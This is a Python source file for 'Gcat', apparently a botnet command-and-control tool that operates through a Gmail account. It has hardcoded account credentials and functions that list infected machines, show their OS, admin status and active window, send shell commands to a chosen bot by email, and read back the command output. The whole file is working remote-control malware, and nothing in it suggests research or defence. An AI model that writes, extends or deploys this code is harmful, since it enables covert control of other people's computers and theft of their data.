import argparse
import email
import imaplib
import sys
import uuid
import string
import ast
import os
import random

from smtplib import SMTP
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders

#######################################
gmail_user = 'gcat.test.mofo@gmail.com'
gmail_pwd = 'gcatmofo123'
server = "smtp.gmail.com"
server_port = 587
#######################################

def genJobID(slen=7):
    return ''.join(random.sample(string.ascii_letters + string.digits, slen))

class Gcat:

    def __init__(self):
        self.c = imaplib.IMAP4_SSL(server)
        self.c.login(gmail_user, gmail_pwd)

    def sendEmail(self, botid, jobid, cmd, arg, attachment=[]):
        msg = MIMEMultipart()
        msg['From'] = 'gcat:{}:{}'.format(botid, jobid)
        msg['To'] = gmail_user
        msg['Subject'] = 'gcat:{}:{}'.format(botid, jobid)
        msgtext = {'CMD': cmd, 'ARG': arg}
        msg.attach(MIMEText(str(msgtext)))
        
        for attach in attachment:
            if os.path.exists(attach) == True:  
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(open(attach, 'rb').read())
                Encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                msg.attach(part)

        mailServer = SMTP()
        mailServer.connect(server, server_port)
        mailServer.starttls()
        mailServer.login(gmail_user,gmail_pwd)
        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
        mailServer.quit()


    def checkBots(self):
        self.c.select(readonly=1)
        bots = []

        rcode, idlist = self.c.uid('search', None, "(UNSEEN)")
        for idn in idlist[0].split():
            msg = email.message_from_string(self.c.uid('fetch', idn, '(RFC822)')[1][0][1])
            try:
                botid = str(uuid.UUID(msg["Subject"]))
                if botid not in bots:
                    bots.append(botid)
                    maintype = msg.get_content_maintype()

                    if maintype == 'multipart':
                        for part in msg.get_payload():
                            if part.get_content_maintype() == 'text':
                                msgtext = ast.literal_eval(part.get_payload().rstrip("\r\n"))
                    
                    elif maintype == 'text':
                        msgtext = ast.literal_eval(msg.get_payload().rstrip("\r\n"))

                    print botid, msgtext['SYS']
            except ValueError:
                pass

    def getBotInfo(self, botid):
        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT '{}')".format(botid))
        for idn in idlist[0].split():
            msg = email.message_from_string(self.c.uid('fetch', idn, '(RFC822)')[1][0][1])

            maintype = msg.get_content_maintype()

            if maintype == 'multipart':
                for part in msg.get_payload():
                    if part.get_content_maintype() == 'text':
                        msgtext = ast.literal_eval(part.get_payload().rstrip("\r\n"))
            
            elif maintype == 'text':
                msgtext = ast.literal_eval(msg.get_payload().rstrip("\r\n"))

            print "ID: " + botid 
            print "OS: " + msgtext['SYS']
            print "ADMIN: " + str(msgtext['ADMIN']) 
            print "FG WINDOW: '{}'".format(msgtext['FGWINDOW'])
            
            return

    def getJobResults(self, botid, jobid):
        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT '{}:{}')".format(botid, jobid))
        for idn in idlist[0].split():
            msg = email.message_from_string(self.c.uid('fetch', idn, '(RFC822)')[1][0][1])

            maintype = msg.get_content_maintype()

            if maintype == 'multipart':
                for part in msg.get_payload():
                    if part.get_content_maintype() == 'text':
                        msgtext = ast.literal_eval(part.get_payload().rstrip("\r\n"))

            elif maintype == 'text':
                msgtext = ast.literal_eval(msg.get_payload().rstrip("\r\n"))

            print "JOBID: " + jobid
            print "CMD: " + msgtext['MSG']['CMD']
            print ''
            print msgtext['MSG']['RES']

            return

    def logout():
        self.c.logout()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Gcat", version='0.0.1')
    parser.add_argument("-l", dest="list", action="store_true", help="List available clients")
    parser.add_argument("--id", dest='id', default='ALL', type=str, help="Client to target")
    parser.add_argument('--job-id', dest='jobid', type=str, help='Job id to retrieve')
    parser.add_argument("-i", dest='info', action='store_true', help='Retrieve info on specified client')
    parser.add_argument("-c", metavar='cmd', dest='cmd', type=str, help='Execute a system command')
    
    if len(sys.argv) is 1:
        parser.print_help()
        sys.exit()

    args = parser.parse_args()
    
    gcat = Gcat()

    if args.list:
        gcat.checkBots()

    elif args.info:
        gcat.getBotInfo(args.id)

    elif args.cmd:
        jobid = genJobID()
        gcat.sendEmail(args.id, jobid, 'cmd', args.cmd)
        print "[*] Command sent successfully with job id: {}".format(jobid)

    elif args.jobid:
        gcat.getJobResults(args.id, args.jobid)

